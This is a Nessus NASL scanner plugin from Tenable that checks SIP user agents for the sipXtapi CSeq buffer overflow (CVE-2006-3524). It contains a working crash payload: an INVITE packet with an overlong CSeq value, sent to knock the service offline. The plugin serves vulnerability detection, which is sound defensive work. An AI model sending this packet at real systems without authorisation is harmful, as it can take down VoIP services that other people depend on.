#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote host contains an application that is vulnerable to a remote
buffer overflow attack. 

Description :

The remote host is running a SIP user agent that appears to be
compiled using a version of SIP Foundry's SipXtapi library before
March 24, 2006.  Such versions contain a buffer overflow flaw that is
triggered when processing a specially-crafted packet with a long value
for the 'CSeq' field.  A remote attacker may be able to exploit this
issue to execute arbitrary code on the affected host subject to the
privileges of the current user. 

See also :

http://www.securityfocus.com/archive/1/439617/30/0/threaded
http://lists.grok.org.uk/pipermail/full-disclosure/2006-July/047794.html

Solution :

Contact the software vendor to see if an upgrade is available. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22092);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-3524");
  script_bugtraq_id(18906);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"27122");

  script_name(english:"sipXtapi CSeq Field Header Denial of Service Vulnerability");
  script_summary(english:"Sends an SIP packet with a bad CSeq field");
 
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("sip_detection.nasl");
  script_require_keys("Services/udp/sip");

  exit(0);
}


port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;


function sip_sendrecv(req)
{
  local_var res, soc;
  global_var port;

  if (isnull(req)) return NULL;

  if (islocalhost()) soc = open_sock_udp(port);
  else soc = open_priv_sock_udp(sport:5060, dport:port);
  if (!soc) return NULL;

  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  return res;
}


# Make sure the service is up.
#
# nb: this is what's used in sip_detection.nasl.
probe = string(
  "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
  "Max-Forwards: 70\r\n",
  "To: <sip:", this_host(), ":", port, ">\r\n",
  "From: Nessus <sip:", this_host(), ":", port, ">\r\n",
  "Call-ID: ", rand(), "\r\n",
  "CSeq: 63104 OPTIONS\r\n",
  "Contact: <sip:", this_host(), ">\r\n",
  "Accept: application/sdp\r\n",
  "Content-Length: 0\r\n",
  "\r\n"
);
if (isnull(sip_sendrecv(req:probe))) exit(0);


# Try to crash the service.
sploit = string(
  "INVITE sip:user@", get_host_name(), " SIP/2.0", "\r\n",
  "To: <sip:", this_host(), ":", port, ">\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
  "From: Nessus <sip:", this_host(), ":", port, ">\r\n",
  "Call-ID: ", rand(), "\r\n",
  "CSeq: 115792089237316195423570AAAA\r\n",
  "Max-Forwards: 70\r\n",
  "Contact: <sip:", this_host(), ">\r\n",
  "\r\n"
);
if (isnull(sip_sendrecv(req:sploit)))
{
  # There's a problem if the service is down now.
  if (isnull(sip_sendrecv(req:probe)))
    security_warning(port:port, proto:"udp", data:desc);
}
